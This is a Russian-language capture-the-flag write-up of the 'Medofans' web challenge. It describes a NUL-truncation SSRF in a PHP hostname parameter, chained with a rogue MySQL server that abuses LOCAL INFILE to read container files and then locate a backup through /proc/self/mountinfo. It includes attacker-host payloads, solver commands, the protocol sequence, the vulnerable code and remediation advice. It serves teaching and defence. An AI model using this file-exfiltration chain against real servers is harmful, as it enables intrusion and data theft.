# Medofans (Badgerfuns) — технический разбор

**Флаг:** `avito{Hon3y_Badg3R_DoNt_C4rE_Abou7_lOcal_1nFile}`
**Класс:** Web / PHP / MySQL

## Краткое техническое резюме

Параметр `lang` конкатенируется с `.db.internal` и передаётся в `mysqli_real_connect`. NUL truncation
на границе PHP string/C string позволяет направить `getaddrinfo` на контролируемый host, создавая SSRF
на фиксированный TCP port 3306. Rogue MySQL server с capability `CLIENT_LOCAL_FILES` отвечает пакетом
`LOCAL INFILE` и получает arbitrary files из web container. Чтение `/proc/self/mountinfo` раскрывает
bind-mounted backup `/opt/backups/hbf_de_backup_2019-05-05.sql`, содержащий флаг.

---

**Для воспроизведения:** Нужны работающий сервис и сервер обратного вызова, доступный с него по TCP/3306. HTTP-туннель сам по себе не переносит MySQL-протокол.

## 1. Контекст и цель

`https://hbfuns-9vqogw6q.avitoctf.ru/` — Bulma/JavaScript frontend. Dynamic content загружается через
единственный API endpoint.

Frontend выполняет `GET /api/content.php?lang=en|ru|de` и получает JSON localization content. Условие
указывает, что flag находится в server-side file.

В locale `de` присутствует запись `Daten aus dem Archiv`, отсутствующая в `en` и `ru`, со значением
`/*REDACTED*/`. SQL comment syntax и указание на archive формируют гипотезу о historical database
backup.

Доступен только адрес target; `content.php` восстанавливается через arbitrary file read из §3.

## 2. Разведка и поверхность атаки

Remote reconnaissance определяет следующий stack:

- Service chain: **Cloudflare → nginx → php-fpm** в web container и отдельный **MariaDB** container,
  доступный по hostname pattern `*.db.internal`. Paths `/api/` и `/assets/` возвращают static content
  или `403`; `.git`, `.env` и backup files недоступны через HTTP.

- **Контролируемая точка входа** — параметр `lang` у `content.php`. Метод
  запроса, заголовки и куки на ответ не влияют — только `lang`.
- **Response generation:** сайт использует `lang` для формирования
  имени host `"{lang}.db.internal"` и schema `"hbf_{lang}"`, подключается как пользователь `web`
  с паролем `webpass`, делает два фиксированных запроса (`SELECT ... FROM translations` и
  `SELECT ... FROM facts`) и возвращает database values без post-processing.

- **Error-based reconnaissance.** Invalid `lang` вызывает разные error messages:
  ```
  lang=zzz → {"error":"...at zzz.db.internal: getaddrinfo failed: Name or service not known"}
  lang=De  → {"error":"...at De.db.internal: Access denied for user 'web'@'%' to database 'hbf_De'"}
  ```
  Errors раскрывают hostname template `<lang>.db.internal`, schema template `hbf_<lang>` и username
  `web`.

## 3. Анализ и проверка гипотез

### 3.1. NUL truncation в `getaddrinfo`

Invalid `lang` обычно приводит к `<lang>.db.internal: getaddrinfo failed`. PHP strings допускают NUL,
тогда как C API `getaddrinfo` получает NUL-terminated string. Для
`lang=<ATTACKER_IP>%00` PHP формирует `"<ATTACKER_IP>\0.db.internal"`, но resolver получает только
`<ATTACKER_IP>`.

Поведение подтверждается error type и response latency:
```
lang=127.0.0.1%00 → "...127.0.0.1 .db.internal: Connection refused"   ~0.1 сек
lang=8.8.8.8%00   → "...8.8.8.8 .db.internal: Connection timed out"   ~3.1 сек
```
Это уже не `getaddrinfo failed`: resolver обработал NUL-truncated hostname, после чего произошла
попытка TCP connection. Получен SSRF primitive на произвольный host с фиксированным port 3306.

### 3.2. Ограничения SSRF primitive

- **Порт всегда 3306.** Двоеточие в `lang` срабатывает раньше NUL-логики: код делает `explode(':')` и
  удаляет всё после `:`, поэтому port не контролируется. Rogue server должен слушать
  именно порт **3306** (стандартный порт MySQL).
- **Outbound connectivity.** Timeout при обращении к публичному `:3306` не доказывает достижимость:
  его может вызывать сетевой фильтр или неработающий сервер. Доступность подтверждается принятым
  соединением и MySQL handshake на контролируемом сервере, а затем фактической передачей файла.

### 3.3. Rogue MySQL server + `LOAD DATA LOCAL INFILE`

Rogue MySQL server выполняет protocol handshake, выставляет capability `CLIENT_LOCAL_FILES`, принимает
authentication без проверки credentials, а на первый query отвечает packet `0xFB + <path>`. Этот
packet инициирует передачу local file со стороны MySQL client.

PHP-клиент `mysqli` с включённой опцией `local_infile` доверяет серверу и отдаёт запрошенный файл
web container в socket rogue server, минуя HTTP response. Чтение выполняется с credentials
`www-data` (uid 33). Таким способом извлекаются `config.php` с `web`/`webpass` и полный `content.php`.

### 3.4. Требование public TCP/3306

Target использует фиксированный MySQL port 3306. Exploit server должен быть доступен по публичному
адресу на TCP/3306; HTTP-only tunnels для этой цели неприменимы.

### 3.5. Проверка database-resident secret

`content.php` возвращает database values без модификации, поэтому `/*REDACTED*/` является текущим
значением. Проверка гипотезы о дополнительной SQL table дала следующие результаты:
- application выполняет два фиксированных query в schema `hbf_{lang}`; host и schema зависят от
  одного `lang`, поэтому
  NUL truncation не разделяет эти значения; по имени резолвятся только `en/ru/de`, их таблицы
  `facts` и `translations` не содержат flag;
- Database работает в отдельном container; чтение `/var/lib/mysql/*` через web client не возвращает
  data;
- direct connection к database завершается `Lost connection`;
- `/proc/self/environ` (переменные окружения процесса) **не читается**: веб-воркер стартовал под root,
  а потом сбросил права на `www-data`; после такого сброса ядро помечает процесс `dumpable=0`, и его
  `environ` становится доступен только root. `/proc/self/status` остаётся world-readable;
- проверка стандартных paths (`/flag*`, `/run/secrets/*`, `.env`) не возвращает flag.

### 3.6. Поиск bind mounts через `/proc/self/mountinfo`

`/proc/self/mountinfo` доступен для чтения и, в отличие от `environ`, не блокируется при `dumpable=0`.
Он раскрывает bind-mounted file:
```
381 345 0:61 / /opt/backups/hbf_de_backup_2019-05-05.sql rw,... - fuse tmpfs ...,allow_other
```

Этот path соответствует backup, упомянутому в немецкой локали. File читается тем же `LOCAL INFILE`
primitive и содержит `mysqldump` схемы `hbf_de` с исходным значением:
> `INSERT INTO facts VALUES (5,'Daten aus dem Archiv','…bewachte eine Tafel, auf der geschrieben stand:`
> `avito{Hon3y_Badg3R_DoNt_C4rE_Abou7_lOcal_1nFile}.','/assets/badger.svg');`

Current database содержит `/*REDACTED*/`, тогда как historical backup сохраняет исходное значение.

## 4. Корневая причина

`content.php` подставляет `$_GET['lang']` в hostname без валидации:

```php
$lang = explode(':', $_GET['lang'], 2)[0];     // ':' срезает порт ещё до NUL-логики
$host = $lang . '.db.internal';                 // NUL-байт обрывает getaddrinfo
$conn = mysqli_init();
mysqli_real_connect($conn, $host, 'web', 'webpass', 'hbf_'.$lang);
```

- **NUL injection / SSRF (CWE-158):** для `lang=<HOST>%00` C API `getaddrinfo` получает только
  `<HOST>`, после чего application устанавливает MySQL connection к `<HOST>:3306`. Суффикс
  `.db.internal` остаётся в PHP string, но не участвует в name resolution.
- **`LOAD DATA LOCAL INFILE` читает файлы КЛИЕНТА.** `mysqli` с включённым `local_infile` доверяет
  server response и передаёт запрошенный local file. Перенаправление client к rogue MySQL server
  предоставляет arbitrary file read из web container.
- **Insecure backup exposure:** незашифрованный `mysqldump` с флагом примонтирован в web container с
  `allow_other`, поэтому доступен непривилегированному `www-data`.

## 5. Эксплуатация

Предпосылка: network-reachable host с открытым TCP/3306. Endpoint за inbound NAT или HTTP-only tunnel
не подходит.

1. Запустить rogue MySQL (`solve_medofans.py`) на `0.0.0.0:3306`.
2. Получить список mounts и определить path backup:
   ```bash
   uv run python medofans/solve_medofans.py \
     --target https://hbfuns-<slug>.avitoctf.ru --connect-back <PUBLIC_IP>
   ```
   Solver инициирует SSRF (`GET .../api/content.php?lang=<PUBLIC_IP>%00`), читает
   `/proc/self/mountinfo`, выделяет non-standard single-file bind mounts вне набора
   `/etc/hosts,/etc/hostname,/etc/resolv.conf` и запрашивает каждый path.
3. `/opt/backups/hbf_de_backup_2019-05-05.sql` читается тем же `LOCAL INFILE` primitive; flag
   извлекается regex `avito\{[^}]*\}`.

Protocol sequence: rogue server отправляет handshake с capability `CLIENT_LOCAL_FILES`, принимает
authentication через `OK`, затем отвечает на первый query packet `0xFB + "/proc/self/mountinfo"`.
Client передаёт file content; после parsing mount table операция повторяется для
`/opt/backups/hbf_de_backup_2019-05-05.sql`.

## 6. Флаг

```
avito{Hon3y_Badg3R_DoNt_C4rE_Abou7_lOcal_1nFile}
```

## 7. Выводы и рекомендации

Exploit chain объединяет NUL truncation в системном resolver interface и доверие MySQL client к
недоверенному server endpoint.

- **Root cause.** Hostname формируется из непроверенного `lang`, а `mysqli` разрешает `LOCAL INFILE`
  при подключении к attacker-controlled endpoint.
- **Diagnostic messages.** Error string формируется PHP-уровнем и не гарантирует, что C resolver получил
  ту же byte sequence. Тип ошибки `getaddrinfo failed` или `Connection refused/timed out` позволяет
  определить фактическое поведение нижнего слоя.
- **Input validation.** User input нельзя конкатенировать в hostname. Допустимые locales должны
  определяться allowlist `en|ru|de`; MySQL client должен отключать `LOCAL INFILE` для недоверенных
  endpoints через `mysqli_options($conn, MYSQLI_OPT_LOCAL_INFILE, false)`. Host/schema mapping должен
  быть статическим.
- **Container path discovery.** При arbitrary file read и неизвестном target path следует анализировать
  `/proc/self/mountinfo`: он world-readable даже когда `environ` закрыт по `dumpable=0`, и Docker
  bind mounts, включая single-file mount `-v ./flag:/x`, раскрывают target path.
- **Backup hygiene.** Незашифрованный dump с secret, доступный web container, создаёт утечку, даже
  если current database redacted. Secrets необходимо удалять из всех retained copies.

## 8. Файлы для воспроизведения

В репозитории:

- [`solve_medofans.py`](solve_medofans.py) — solver: поднимает rogue MySQL, инициирует SSRF и
  определяет flag path через `mountinfo` (stdlib + `requests`). Параметры `--target` /
  `--connect-back`; запускать с публичного `:3306`.
- [`content_en.json`](content_en.json) / [`content_ru.json`](content_ru.json) /
  [`content_de.json`](content_de.json) — сохранённые locale responses; `de`
  содержит запись `Daten aus dem Archiv` со значением `/*REDACTED*/`.
- [`app.js`](app.js) — frontend сайта, формирующий запрос к `/api/content.php?lang=...`.
- [`FLAG.txt`](FLAG.txt) — извлечённый флаг.

Recovered `content.php`, `config.php`, `/proc/self/mountinfo` и SQL backup не входят в
набор файлов в Git; solver получает необходимые runtime artifacts через `LOCAL INFILE`.
Frontend image `badger.svg` не требуется solver и также не включены в Git.
